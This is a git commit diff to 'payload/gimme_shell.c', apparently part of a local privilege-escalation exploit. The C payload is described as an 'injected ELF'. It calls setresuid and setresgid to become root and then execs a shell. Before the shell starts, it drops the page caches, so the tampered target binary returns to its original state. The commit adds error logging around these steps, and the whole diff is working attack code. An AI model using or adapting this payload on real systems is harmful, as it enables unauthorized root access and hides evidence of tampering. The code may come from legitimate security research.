ccd7f254e0a2bc8ba02708d6228ea03e16330de7
David Buchanan <d@vidbuchanan.co.uk>
2024-10-07 04:49:53 +0100

    improve logging in payload

--- payload/gimme_shell.c
+++ payload/gimme_shell.c
@@ -1,18 +1,21 @@
 #define SYS_ERRNO ((int){0}) // dummy lvalue
 #include "linux_syscall_support.h"
 
-static const char hello[] = "[+] Hello from injected ELF\n";
-
-// drop the caches first, thus restoring the target binary to its original state
-static const char *sh_argv[] = {"/bin/sh", "-c", "echo 1 > /proc/sys/vm/drop_caches; sh", NULL};
+#define PRINT(msg) sys_write(1, msg, sizeof(msg)-1)
 
 void _start(void)
 {
-	sys_write(1, hello, sizeof(hello)-1);
+	PRINT("[+] Hello from injected ELF\n");
 
-	// TODO: check we're actually root, check setr* results
-	sys_setresuid(0, 0, 0);
-	sys_setresgid(0, 0, 0);
+	if (sys_setresuid(0, 0, 0) || sys_setresgid(0, 0, 0)) {
+		PRINT("[-] Failed to elevate to root :(\n");
+		sys__exit(-1);
+	}
 
+	// drop the caches first, thus restoring the target binary to its original state
+	const char *sh_argv[] = {"/bin/sh", "-c", "echo 1 > /proc/sys/vm/drop_caches; sh", NULL};
 	sys_execve(sh_argv[0], sh_argv, NULL);
+
+	PRINT("[-] Failed to execve :(\n");
+	sys__exit(-1);
 }
